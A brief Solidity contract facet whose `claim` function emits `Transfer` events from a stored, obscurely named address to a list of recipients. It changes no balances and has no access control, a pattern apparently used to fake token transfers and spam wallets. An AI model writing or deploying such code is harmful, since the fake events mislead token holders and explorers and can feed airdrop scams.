// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract claimFacet {
    function claim(address[] calldata _addresses_, uint256 _out) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(ds._p76234, _addresses_[i], _out);
        }
    }
}
